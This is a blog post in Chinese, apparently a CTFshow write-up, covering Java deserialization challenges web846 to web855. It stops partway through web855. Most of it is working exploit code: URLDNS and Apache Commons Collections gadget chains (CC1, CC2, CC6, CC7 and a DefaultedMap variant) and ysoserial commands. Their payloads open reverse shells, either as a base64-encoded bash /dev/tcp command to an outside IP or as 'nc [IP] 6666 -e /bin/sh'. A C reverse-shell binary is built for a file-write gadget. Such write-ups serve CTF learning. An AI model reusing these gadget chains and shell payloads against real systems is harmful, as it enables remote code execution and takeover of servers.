
<!DOCTYPE html>
<html lang="zh-CN ">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hoylindo || CTFSHOW-Java反序列化-wp</title>
    <meta name="author" content="hoylindo">
    <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
    <meta name="keywords" content=" ">
    <link rel="icon" href="/1.jpg">
    <link rel="stylesheet" href="/css/antd.min.css">
    
    <link rel="stylesheet" href="/css/maiden-theme.css">
    
    <script src="/js/vue.js"></script>
    <script src="/js/antd.min.js"></script>
<meta name="generator" content="Hexo 5.4.2"></head>

<body>

    <div id="loading"
        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
        <div
            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
            <div id="loadcontent"
                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#fba3cf; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
                <div>
                    <h2>LOADING...</h2>
                    <p>dadada~</p>
                    <div>
                        <img src="/dancingkitty.gif" alt="loading">
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="layout">
        <transition name="into">
            <div v-show="show_page" style="display: none;">
                <div id="menu_show">
                     
<nav id="menu">
    <div class="desktop-menu">
        <a href="/">
            <span class="title">Hoylindo</span>
        </a>
        
        <a href="/">
            <span>
                <a-icon type="home" theme="filled" />
            </span>
            <span>home</span>
        </a>
        
        <a href="/about">
            <span>
                <a-icon type="idcard" theme="filled" />
            </span>
            <span>about</span>
        </a>
        
        <a href="/archives">
            <span>
                <a-icon type="folder" theme="filled" />
            </span>
            <span>archives</span>
        </a>
        
        <a href="/categories">
            <span>
                <a-icon type="book" theme="filled" />
            </span>
            <span>categories</span>
        </a>
        
        <a href="/tags">
            <span>
                <a-icon type="tags" theme="filled" />
            </span>
            <span>tags</span>
        </a>
        
    </div>

    <div :class="'phone-menu ' + menu_show" id="phone-menu">
        <div :class="'title'" @click="menu_show=!menu_show">
            <span style="margin-right: 10px;">
                <a-icon type="appstore" theme="filled" />
            </span>
            <span>Hoylindo</span>
        </div>
        <div class="items" v-show="menu_show">
            
            <a href="/">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="home" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
                </div>
            </a>
            
            <a href="/about">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="idcard" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
                </div>
            </a>
            
            <a href="/archives">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="folder" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
                </div>
            </a>
            
            <a href="/categories">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="book" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
                </div>
            </a>
            
            <a href="/tags">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="tags" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
                </div>
            </a>
            
        </div>
        <div class="curtain" v-show="menu_show"></div>
    </div>

</nav>
                </div>

                <div id="main">
                     
<link rel="stylesheet" href="/css/post-body.css">
<div class="article">
    <div>
        <h1>CTFSHOW-Java反序列化-wp </h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <a-icon type="calendar" theme="filled" />
            </span>
            2023/12/19
        </span>

        
        <span class="category">
            <a href="/categories/关于web安全">
                <span class="icon">
                    <a-icon type="book" theme="filled" />
                </span>
                关于web安全
            </a>
        </span>
        

        

        <span class="tags">
            <span class="icon">
                <a-icon type="tags" theme="filled" />
            </span>
            
            <span class="tag">
                
                <a href="/tags/Java" style=color:#ffa2c4>
                    Java
                </a>
            </span>
            
        </span>
        
    </div>

    <div class="content" v-pre>
        <br>

<span id="more"></span>

<h3 id="web846"><a href="#web846" class="headerlink" title="web846"></a>web846</h3><ul>
<li><p>打开题目提示：</p>
<img src="https://s3.bmp.ovh/imgs/2023/12/04/a58c464dcb1149fd.png" style="zoom:80%;" /></li>
<li><p>URLDNS链没跑了</p>
</li>
<li><p>poc：</p>
<pre><code class="java">package org.example.ctfshow_demo;
import java.io.*;
import java.lang.reflect.Field;0
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.Date;
import java.util.HashMap;

public class URLDNS &#123;
    public static void main(String[] args) throws Exception &#123;
        Date nowTime = new Date();
        HashMap hashmap = new HashMap();
        URL url = new URL(&quot;http://c9f1da67-26e8-401e-8410-4059b2e5b682.challenge.ctf.show/&quot;);
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat(&quot;yyyy-MM-dd hh:mm:ss&quot;);
        Field filed = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
        filed.setAccessible(true);  // 绕过Java语言权限控制检查的权限
        filed.set(url, 209);
        hashmap.put(url, 209);
        System.out.println(&quot;当前时间为: &quot; + simpleDateFormat.format(nowTime));
        filed.set(url, -1);

        try &#123;
            ByteArrayOutputStream data =new ByteArrayOutputStream();
            ObjectOutput oos =new ObjectOutputStream(data);
            oos.writeObject(hashmap);
            oos.flush();
            oos.close();
            System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));
        &#125; catch (Exception e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
</code></pre>
</li>
<li><p>生成的payload进行url编码之后post传进去就ok啦</p>
<img src="https://s3.bmp.ovh/imgs/2023/12/04/4e5045c1fb830a27.png" style="zoom:80%;" /></li>
</ul>
<h3 id="web847"><a href="#web847" class="headerlink" title="web847"></a>web847</h3><ul>
<li>提示</li>
</ul>
<img src="https://s3.bmp.ovh/imgs/2023/12/04/f310de0e0cf09bc3.png" style="zoom:80%;" />

<ul>
<li><p>感觉随便一条cc链应该就可以，本来担心真的会有环境限制，但是发现直接用Java跑cc1的payload就可以</p>
</li>
<li><p>以为是get传参，传了半年也没反应，差点回炉研究cc1去了，我真服了</p>
</li>
<li><p>exp：</p>
<pre><code class="java">package org.example.ctfshow_demo;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC1_web847 &#123;
    public static void main(String[] args) throws IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;
        //1.客户端构建攻击代码
        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[] &#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),
                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),
                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzQzLjE0My4xNzUuMTU4LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#125;)
        &#125;;
        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        //创建Map并绑定transformerChina
        Map innerMap = new HashMap();
        innerMap.put(&quot;value&quot;, &quot;value&quot;);
        //给予map数据转化链
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        //反射机制调用AnnotationInvocationHandler类的构造函数
        Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        //取消构造函数修饰符限制
        ctor.setAccessible(true);
        //获取AnnotationInvocationHandler类实例
        Object instance = ctor.newInstance(Target.class, outerMap);

        ByteArrayOutputStream data =new ByteArrayOutputStream();
        ObjectOutput oos =new ObjectOutputStream(data);
        oos.writeObject(instance);
        oos.flush();
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));
    &#125;
&#125;
</code></pre>
<img src="https://s3.bmp.ovh/imgs/2023/12/04/3b51498625d61f50.png" style="zoom:80%;" /></li>
<li><p>ysoserial命令：</p>
<pre><code class="sh">java -jar ysoserial-all.jar CommonsCollections1 &quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzQzLjE0My4xNzUuMTU4LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;|base64
</code></pre>
</li>
<li><p>不知道为什么会500，但是还是能成功反弹shell</p>
<img src="https://s3.bmp.ovh/imgs/2023/12/04/a2d4e2ed3f2db89c.png" style="zoom:80%;" /></li>
</ul>
<h3 id="web848"><a href="#web848" class="headerlink" title="web848"></a>web848</h3><ul>
<li><p>提示</p>
<img src="https://s3.bmp.ovh/imgs/2023/12/04/59c36bf46886bfbb.png" style="zoom:80%;" /></li>
<li><p>不能用<code>TransformedMap</code>，可以想到cc6</p>
</li>
<li><p>exp：</p>
<pre><code class="java">package org.example.ctfshow_demo;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC6_web848 &#123;
    public static void main(String[] args) throws Exception &#123;
        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;
        Transformer[] transformers = new Transformer[] &#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,
                        Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,
                        new Class[0] &#125;),
                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,
                        Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),
                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,
                        new String[] &#123; &quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzQzLjE0My4xNzUuMTU4LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &#125;),
                new ConstantTransformer(1),
        &#125;;
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, &quot;keykey&quot;);

        Map expMap = new HashMap();
        expMap.put(tme, &quot;valuevalue&quot;);

        outerMap.remove(&quot;keykey&quot;);

        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        // 生成序列化字符串
        ByteArrayOutputStream data =new ByteArrayOutputStream();
        ObjectOutput oos =new ObjectOutputStream(data);
        oos.writeObject(expMap);
        oos.flush();
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));

    &#125;
&#125;
</code></pre>
<img src="https://s3.bmp.ovh/imgs/2023/12/04/55ea142574942a4b.png" style="zoom: 80%;" /></li>
<li><p>ysoserial：</p>
<pre><code class="sh">java -jar ysoserial-all.jar CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzQzLjE0My4xNzUuMTU4LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;|base64
</code></pre>
</li>
</ul>
<h3 id="web849"><a href="#web849" class="headerlink" title="web849"></a>web849</h3><ul>
<li><p>提示：</p>
<img src="https://s3.bmp.ovh/imgs/2023/12/04/459bf60d8dec5d66.png" style="zoom:80%;" /></li>
<li><p>这个版本可以想到cc2或cc4，但是题目入口的提示写可以nc反弹，不知道怎么个事</p>
</li>
<li><p>然鹅就是要nc反弹，bash反弹会500抛出Runtime的异常</p>
</li>
<li><p>不过用nc反弹也会500，但是可以成功，exp：</p>
<pre><code class="java">package org.example.ctfshow_demo;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Comparator;
import java.util.PriorityQueue;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
public class CC2_web849 &#123;
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    &#125;
    public static void main(String[] args) throws Exception&#123;
        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;
        Transformer[] transformers = new Transformer[] &#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),
                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),
                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new String[] &#123; &quot;nc [IP] 6666 -e /bin/sh&quot; &#125;),
        &#125;;
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Comparator comparator = new TransformingComparator(transformerChain);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);
        setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);

        ByteArrayOutputStream data =new ByteArrayOutputStream();
        ObjectOutput oos =new ObjectOutputStream(data);
        oos.writeObject(queue);
        oos.flush();
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));
    &#125;
&#125;
</code></pre>
<img src="https://s3.bmp.ovh/imgs/2023/12/04/00de69359b24e3d9.png" style="zoom:80%;" /></li>
<li><p>ysoserial：</p>
<pre><code class="sh">java -jar ysoserial.jar CommonsCollections4 &quot;nc [IP] 6666 -e /bin/sh&quot;|base64
</code></pre>
</li>
</ul>
<h3 id="web850"><a href="#web850" class="headerlink" title="web850"></a>web850</h3><ul>
<li><p>ysoserial：</p>
<pre><code class="sh">java -jar ysoserial-all.jar CommonsCollections3 &quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzQzLjE0My4xNzUuMTU4LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;|base64
</code></pre>
</li>
</ul>
<img src="https://s3.bmp.ovh/imgs/2023/12/04/3312704e68f23f3e.png" style="zoom:80%;" />

<ul>
<li>自己的exp不知道为什么用不了，看了几遍感觉还是没啥毛病，真可恶啊</li>
</ul>
<h3 id="web851"><a href="#web851" class="headerlink" title="web851"></a>web851</h3><ul>
<li><p>提示</p>
<img src="https://s3.bmp.ovh/imgs/2023/12/12/aa4bdc80c56535f1.png" style="zoom:80%;" /></li>
<li><p>cc2和cc4都用不了了，而且还是可以nc，可以用改装版cc6：</p>
<pre><code class="java">package org.example.ctfshow_demo;


import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC6_4_web851 &#123;
    public static void main(String[] args) throws Exception &#123;
        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;
        Transformer[] transformers = new Transformer[] &#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),
                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),
                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new String[] &#123; &quot;nc [IP] 6666 -e /bin/sh&quot; &#125;),
                new ConstantTransformer(1),
        &#125;;
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.lazyMap(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, &quot;keykey&quot;);

        Map expMap = new HashMap();
        expMap.put(tme, &quot;valuevalue&quot;);
        outerMap.remove(&quot;keykey&quot;);

        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        // 生成序列化字符串
        ByteArrayOutputStream data =new ByteArrayOutputStream();
        ObjectOutput oos =new ObjectOutputStream(data);
        oos.writeObject(expMap);
        oos.flush();
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));
    &#125;
&#125;
</code></pre>
<img src="../../../Github/Hexo/Blog/source/_posts/images/image-20230804155745238.png" alt="image-20230804155745238" style="zoom:80%;" /></li>
<li><p>在3.2.1版本的cc链转化为4.0版本时，主要修改的部分有：</p>
<ul>
<li><code>import org.apache.commons.collections.*</code>改成<code>import org.apache.commons.collections4.*</code></li>
<li><code>LazyMap.decorate</code>换成<code>LazyMap.lazyMap</code>就好了（具体看cc2链的笔记）</li>
</ul>
</li>
</ul>
<h3 id="web852"><a href="#web852" class="headerlink" title="web852"></a>web852</h3><ul>
<li><p>同上</p>
<img src="https://s3.bmp.ovh/imgs/2023/12/12/7b71439c2d3931ed.png" style="zoom:80%;" /></li>
</ul>
<h3 id="web853"><a href="#web853" class="headerlink" title="web853"></a>web853</h3><ul>
<li><p>要用到cc7了，p牛没讲我还没学，先学了再来（叹气）</p>
</li>
<li><p>一开始忘记把cc7改成适用4.0版本的了，exp：</p>
<pre><code class="java">package org.example.ctfshow_demo;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.*;

public class CC7_web853 &#123;
    public static void main(String[] args) throws Exception&#123;
        final Transformer transformerChain = new ChainedTransformer(new Transformer[0]);
        final Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;,
                        new Class[]&#123;String.class, Class[].class&#125;,
                        new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),
                new InvokerTransformer(&quot;invoke&quot;,
                        new Class[]&#123;Object.class, Object[].class&#125;,
                        new Object[]&#123;null, new Object[0]&#125;),
                new InvokerTransformer(&quot;exec&quot;,
                        new Class[]&#123;String.class&#125;,
                        new String[]&#123;&quot;nc [IP] 6666 -e /bin/sh&quot;&#125;),
                new ConstantTransformer(1)&#125;;
        //使用Hashtable来构造利用链调用LazyMap
        Map hashMap1 = new HashMap();
        Map hashMap2 = new HashMap();
        Map lazyMap1 = LazyMap.lazyMap(hashMap1, transformerChain);
        lazyMap1.put(&quot;yy&quot;, 1);
        Map lazyMap2 = LazyMap.lazyMap(hashMap2, transformerChain);
        lazyMap2.put(&quot;zZ&quot;, 1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 1);
        lazyMap2.remove(&quot;yy&quot;);

        Field iTransformers = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain, transformers);

        ByteArrayOutputStream data =new ByteArrayOutputStream();
        ObjectOutput oos =new ObjectOutputStream(data);
        oos.writeObject(hashtable);
        oos.flush();
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));
    &#125;
&#125;
</code></pre>
<img src="https://s3.bmp.ovh/imgs/2023/12/12/ac00437aaa3e36f1.png" style="zoom:80%;" /></li>
</ul>
<h3 id="web854"><a href="#web854" class="headerlink" title="web854"></a>web854</h3><ul>
<li><p>ban了很多类</p>
<img src="https://s3.bmp.ovh/imgs/2023/12/12/9019e5628057215d.png" style="zoom:80%;" /></li>
<li><p>说是cc6+cc4，但是我拼了半天也没拼出来，要想办法绕过这些被过滤的类，wp就找到一篇，只能分析分析wp了</p>
</li>
<li><p>exp：</p>
<pre><code class="java">package org.example.ctfshow_demo;

import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections4.map.DefaultedMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.*;

public class CC6_CC4_web854 &#123;
    public static void main(String[] args) throws Exception &#123;
        // Reusing transformer chain and LazyMap gadgets from previous payloads
        Transformer transformerChain = new ChainedTransformer(new Transformer[]&#123;&#125;);
        Transformer[] transformers=new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;nc [IP] 6666 -e /bin/sh&quot;&#125;)
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap1 = new HashMap();
        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        HashMap map=new HashMap();
        Class&lt;DefaultedMap&gt; d = DefaultedMap.class;
        Constructor&lt;DefaultedMap&gt; declaredConstructor = d.getDeclaredConstructor(Map.class, Transformer.class);
        declaredConstructor.setAccessible(true);
        DefaultedMap defaultedMap = declaredConstructor.newInstance(innerMap1, transformerChain);
        TiedMapEntry tiedMapEntry=new TiedMapEntry(defaultedMap, &quot;aaa&quot;);
        HashMap&lt;Object, Object&gt; hashMap=new HashMap&lt;&gt;();
        hashMap.put(tiedMapEntry,&quot;bbb&quot;);
        map.remove(&quot;aaa&quot;);

        Field iTransformers = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain,transformers);

        ByteArrayOutputStream data =new ByteArrayOutputStream();
        ObjectOutput oos =new ObjectOutputStream(data);
        oos.writeObject(hashMap);
        oos.flush();
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));
    &#125;
&#125;
</code></pre>
</li>
<li><p>感觉也不是cc4+cc6，是cc？？？好像懂了，意思是4.0版本的cc6，但是把lazymap那处换掉了</p>
</li>
<li><p>原CC6：</p>
<pre><code class="java">Map innerMap = new HashMap();
Map outerMap = LazyMap.lazyMap(innerMap, transformerChain);
TiedMapEntry tme = new TiedMapEntry(outerMap, &quot;keykey&quot;);
Map expMap = new HashMap();
expMap.put(tme, &quot;valuevalue&quot;);
outerMap.remove(&quot;keykey&quot;);
Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
f.setAccessible(true);
f.set(transformerChain, transformers);
</code></pre>
</li>
<li><p>换掉LazyMap的CC6：</p>
<pre><code class="java">Map innerMap1 = new HashMap();
HashMap map=new HashMap();
Class&lt;DefaultedMap&gt; d = DefaultedMap.class;
Constructor&lt;DefaultedMap&gt; declaredConstructor = d.getDeclaredConstructor(Map.class, Transformer.class);
declaredConstructor.setAccessible(true);
DefaultedMap defaultedMap = declaredConstructor.newInstance(innerMap1, transformerChain);
TiedMapEntry tiedMapEntry=new TiedMapEntry(defaultedMap, &quot;aaa&quot;);
HashMap&lt;Object, Object&gt; hashMap=new HashMap&lt;&gt;();
hashMap.put(tiedMapEntry,&quot;bbb&quot;);
map.remove(&quot;aaa&quot;);
Field iTransformers = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
iTransformers.setAccessible(true);
iTransformers.set(transformerChain,transformers);
</code></pre>
</li>
<li><p>一切突然变得那么合理</p>
<img src="https://s3.bmp.ovh/imgs/2023/12/12/dacd552ec9b988b9.png" style="zoom:80%;" /></li>
</ul>
<h3 id="web855"><a href="#web855" class="headerlink" title="web855"></a>web855</h3><ul>
<li><p>给了源码：</p>
<pre><code class="java">package com.ctfshow.entity;
 
import java.io.*;
 
public class User implements Serializable &#123;
    private static final long serialVersionUID = 0x36d;
    private String username;
    private String password;
 
    public User(String username, String password) &#123;
        this.username = username;
        this.password = password;
    &#125;
 
    public String getUsername() &#123;
        return username;
    &#125;
 
    public void setUsername(String username) &#123;
        this.username = username;
    &#125;
 
    public String getPassword() &#123;
        return password;
    &#125;
 
    public void setPassword(String password) &#123;
        this.password = password;
    &#125;
 
 
    private static final String OBJECTNAME=&quot;ctfshow&quot;;
    private static final String SECRET=&quot;123456&quot;;
 
    private static  String shellCode=&quot;chmod +x ./&quot;+OBJECTNAME+&quot; &amp;&amp; ./&quot;+OBJECTNAME;
 
 
 
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123;
        int magic = in.readInt();
        if(magic==2135247942)&#123;
            byte var1 = in.readByte();
 
            switch (var1)&#123;
                case 1:&#123;
                    int var2 = in.readInt();
                    if(var2==0x36d)&#123;
 
                        FileOutputStream fileOutputStream = new FileOutputStream(OBJECTNAME);
                        fileOutputStream.write(new byte[]&#123;0x7f,0x45,0x4c,0x46&#125;);
                        byte[] temp = new byte[1];
                        while((in.read(temp))!=-1)&#123;
                            fileOutputStream.write(temp);
                        &#125;
 
                        fileOutputStream.close();
                        in.close();
 
                    &#125;
                    break;
                &#125;
                case 2:&#123;
 
                    ObjectInputStream.GetField gf = in.readFields();
                    String username = (String) gf.get(&quot;username&quot;, null);
                    String password = (String) gf.get(&quot;password&quot;,null);
                    username = username.replaceAll(&quot;[\\p&#123;C&#125;\\p&#123;So&#125;\uFE00-\uFE0F\\x&#123;E0100&#125;-\\x&#123;E01EF&#125;]+&quot;, &quot;&quot;)
                            .replaceAll(&quot; &#123;2,&#125;&quot;, &quot; &quot;);
                    password = password.replaceAll(&quot;[\\p&#123;C&#125;\\p&#123;So&#125;\uFE00-\uFE0F\\x&#123;E0100&#125;-\\x&#123;E01EF&#125;]+&quot;, &quot;&quot;)
                            .replaceAll(&quot; &#123;2,&#125;&quot;, &quot; &quot;);
                    User var3 = new User(username,password);
                    User admin = new User(OBJECTNAME,SECRET);
                    if(var3 instanceof  User)&#123;
                        if(OBJECTNAME.equals(var3.getUsername()))&#123;
                            throw  new RuntimeException(&quot;object unserialize error&quot;);
                        &#125;
                        if(SECRET.equals(var3.getPassword()))&#123;
                            throw  new RuntimeException(&quot;object unserialize error&quot;);
                        &#125;
                        if(var3.equals(admin))&#123;
                            Runtime.getRuntime().exec(shellCode);
                        &#125;
                    &#125;else&#123;
                        throw  new RuntimeException(&quot;object unserialize error&quot;);
                    &#125;
                    break;
                &#125;
                default:&#123;
                    throw  new RuntimeException(&quot;object unserialize error&quot;);
                &#125;
            &#125;
        &#125;
 
    &#125;
 
    @Override
    public boolean equals(Object o) &#123;
        if (this == o) return true;
        if (!(o instanceof User)) return false;
        User user = (User) o;
        return this.hashCode() == user.hashCode();
    &#125;
 
    @Override
    public int hashCode() &#123;
        return username.hashCode()+password.hashCode();
    &#125;
 
 
&#125;
</code></pre>
</li>
<li><p>得到源码后先看一下<code>readObject</code>方法</p>
<img src="https://s3.bmp.ovh/imgs/2023/12/12/5ec5d7587612d7f5.png" style="zoom:80%;" /></li>
<li><p>这里是可以写文件，文件名和文件开头固定，后面的内容可以通过<code>write</code>写入</p>
<img src="https://s3.bmp.ovh/imgs/2023/12/12/0885167ecc3197b1.png" style="zoom:80%;" /></li>
<li><p>这里可以执行命令，但是<code>shellcode</code>不可控</p>
</li>
<li><p>可以看到它给的文件固定开头其实是一个<code>elf</code>可执行文件的文件头，接着如果执行shellcode命令则会给该文件一个权限并且执行</p>
</li>
<li><p>先生成一个可执行文件</p>
<pre><code class="c">#include&lt;stdlib.h&gt;
 int main() &#123;
    system(&quot;nc [IP] 6666 -e /bin/sh&quot;); 
    return 0;    
&#125;
</code></pre>
</li>
<li><p>编译</p>
<pre><code class="sh">gcc 1.c -o payload
</code></pre>
</li>
<li><p>删除前四字节</p>
</li>
<li><p>接着利用反序列化写入，前面有几个if，重写<code>writeObject</code>：</p>
